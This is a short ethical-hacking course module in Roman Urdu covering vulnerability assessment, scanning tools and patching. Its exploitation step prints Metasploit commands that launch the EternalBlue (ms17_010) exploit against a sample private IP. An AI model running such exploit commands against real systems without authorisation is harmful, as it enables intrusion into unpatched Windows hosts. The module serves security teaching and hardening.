Module 3: System Vulnerability Assessment & Patching

System Vulnerability Assessment ka matlab hota hai kisi Operating System (Windows, Linux) ya Server mein security loopholes aur kamzoriyan dhoondna taake unhein secure kiya ja sake.

⚠️ Step 1: Vulnerability (Khami/Bug) Kya Hoti Hai?
Software code ya system configuration mein mojood aisi Galti ya Kamzori jiska faida utha kar hacker system par unauthorized access hasil kar le, usay **Vulnerability** kehte hain.

Jab tak yeh bug pata nahi chalta usay *Zero-Day Vulnerability* kehte hain, aur jab hacker is galti ka faida uthate hue attack karta hai usay *Exploit* kehte hain.
🔍 Step 2: Vulnerability Assessment Kya Hoti Hai?
Yeh ek systematically process hai jisme system ke tamam kamzor pehluon ko analyze kiya jata hai. Iske 4 main steps hotay hain:
  • 1. Identification: System mein kamzoriyan aur bugs trace karna.
  • 2. Analysis: Khami ki wajah aur severity (Low, Medium, Critical) ko samajhna.
  • 3. Evaluation: Dekhna ke is bug se system ko kitna nuksan ho sakta hai.
  • 4. Remediation: Bug ko fix (patch) karke system ko dobara secure karna.
🛠️ Step 3: Vulnerability Scanning Tools
Manual testing ke ilawa Ethical Hackers automated scanners ka istemal karte hain jo pure system ko scan karke bugs ki report tayyar karte hain:
  • Nessus: Dunya ka sab se ziada istemal hone wala vulnerability scanner.
  • OpenVAS: Ek Powerful open-source vulnerability assessment tool.
  • Nikto: Web server ki outdated scripts aur kamzoriyon ko scan karne ke liye.
🧪 Step 4: Metasploit Framework (Exploitation Test)
Bug dhoondne ke baad test kiya jata hai ke kya waqai is bug se system hack ho sakta hai ya nahi. Is ke liye Metasploit istemal hota hai:
# Metasploit Console Start Karna
msfconsole

# Vulnerability Ke Liya Exploit Search Karna
search ms17_010

# Target IP Set Karke Test Run Karna
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.5
exploit
🛡️ Step 5: System Security Patching & Hardening
Vulnerabilities milne ke baad Ethical Hacker ka kaam unhein band karna hota hai:
  • Software Updates: Operating system aur apps ko hamesha latest security patch par update rakhein.
  • Unused Ports/Services Disable: Jin ports aur services ki zaroorat na ho unhein close kar dein.
  • Strong Authentication: Multi-Factor Authentication (MFA) aur strong passwords ka nifaz.
